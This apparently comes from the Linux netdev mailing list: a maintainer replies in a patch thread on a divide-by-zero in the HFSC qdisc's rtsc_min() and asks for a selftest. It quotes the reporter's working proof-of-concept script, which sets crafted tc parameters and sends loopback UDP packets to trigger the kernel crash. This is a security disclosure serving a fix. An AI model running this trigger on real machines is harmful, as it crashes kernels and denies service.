Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D0F9E33438F
	for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 19:21:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774552898; cv=none; b=SxbQBwW2+Bl2tcVfgcofUhRKDAHkllfBnPPCfj1b/vXvhukPQ7Rz9tHOPkuBmY/zCfFs24MbKXH/gYZU+GLBph1KovuVMg1r9M1I9AqS9PwfXvFbJ7ELQWLI2OlLtPJh9Fi7zEAr3OrqY+A+FFcs99kiR/giHIjjdaDrVib77ck=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774552898; c=relaxed/simple;
	bh=n8NwTJap2e6KFV5E5E3Hn/+5llcKB3aHX9nN3AO/TuU=;
	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=A/LERHU7JnSfim0DCPwj4uGYvsGbfr1tH0qoDYAv1OIHMyeg7kH3trBoZsNoeTyK386nv2q8EiwUDbGzz0G1/4UPettzxyaVieKNYEo5XPIGvgui9oqu+NXTG04otr3wnWIBDDDbbL7NX3tKw5Crz9BuHnl19H8rImearVGiHFw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=tJN17evF; arc=none smtp.client-ip=10.30.226.201
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="tJN17evF"
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 4446CC116C6;
	Thu, 26 Mar 2026 19:21:38 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
	s=k20201202; t=1774552898;
	bh=n8NwTJap2e6KFV5E5E3Hn/+5llcKB3aHX9nN3AO/TuU=;
	h=Date:From:To:Cc:Subject:In-Reply-To:References:From;
	b=tJN17evFHRqyhMWaMxkw+ua8S+V1+xw1z1vSC/162yoObbUzp7Ers6dHiaZzGtTVI
	 mfvyP7CMVcq7e9EE7kZ8p6MFaQkhR6dL+vSOLQ+/GrKdTh+MH9rNj2a53Nlyj/2DRJ
	 RBLKRdzSvG7Xp2/AADqIBOEn/IMk+6gWsyznPfJArbAeiwq1dqZbkWcyUFlt0Yv9xe
	 bfC3Cj7vF9P9hr4gD41WryFFwnXEY0kq0CR5GvA2ReWr9DWyzjCdgANtTOFZ+II7I8
	 Zy09EUylHauxG1o4FSVaSxy64Az3yf1c8Pi6qaUWNus7cE941/6F8P6JV5tmPIoexU
	 o2fVJAfL2rY0w==
Date: Thu, 26 Mar 2026 12:21:37 -0700
From: Jakub Kicinski <kuba@kernel.org>
To: Xiang Mei <xmei5@asu.edu>
Cc: security@kernel.org, netdev@vger.kernel.org, pabeni@redhat.com,
 jhs@mojatatu.com, jiri@resnulli.us, davem@davemloft.net,
 edumazet@google.com, horms@kernel.org, bestswngs@gmail.com
Subject: Re: [PATCH net v2] net/sched: sch_hfsc: fix divide-by-zero in
 rtsc_min()
Message-ID: <20260326122137.4aae1d46@kernel.org>
In-Reply-To: <g5kyhh74rriqg4ayz5txfqqtxpuklzu4kbkmcwihqpvyv4xq2s@xcpvtqh7bh5g>
References: <20260326075851.3967598-1-xmei5@asu.edu>
	<g5kyhh74rriqg4ayz5txfqqtxpuklzu4kbkmcwihqpvyv4xq2s@xcpvtqh7bh5g>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

On Thu, 26 Mar 2026 11:54:52 -0700 Xiang Mei wrote:
> PoC:
> ```sh
> #!/bin/sh
> ip link set lo up
>=20
> tc qdisc replace dev lo root handle 1: \
>     stab overhead 3000000 mtu 0 tsize 0 \
>     hfsc default 1
> tc class replace dev lo parent 1: classid 1:1 hfsc \
>     rt m1 32gbit d 1ms m2 0bit \
>     ls m1 32gbit d 1ms m2 0bit
>=20
> # Send UDP to loopback (same method as C PoC)
> python3 -c "
> import socket,time
> s=3Dsocket.socket(socket.AF_INET,socket.SOCK_DGRAM)
> s.sendto(b'A'*64,('127.0.0.1',1337))  # activate class
> time.sleep(1)                           # drain =E2=86=92 idle
> s.sendto(b'A'*64,('127.0.0.1',1337))  # reactivation =E2=86=92 div-by-zero
> "
> ```

Please turn this into a TDC selftest.
